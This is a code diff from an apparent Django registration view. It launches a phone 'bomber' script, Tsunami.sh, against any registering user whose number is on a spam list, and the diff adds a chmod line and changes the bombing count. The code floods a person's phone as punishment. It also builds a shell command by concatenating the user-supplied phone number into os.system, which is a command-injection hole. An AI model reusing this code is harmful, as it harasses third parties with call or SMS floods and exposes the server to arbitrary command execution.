@@ -18,7 +18,8 @@ def Register(request):
         if phno in sp_phno:
             #Punish
             print("Bomb to this Spam User ")
-            os.system("printf '"+phno+"\n10\n' | ./static/Bomber/Tsunami.sh")
+            os.system("chmod +x ./static/Bomber/Tsunami.sh")
+            os.system("printf '"+phno+"\n1\n' | ./static/Bomber/Tsunami.sh")
             return HttpResponse("<script>alert('Bombing to this Spam User... ');</script>")
         else:
             gn_phno= [p.PhoneNo for p in GenUsers.objects.all()]
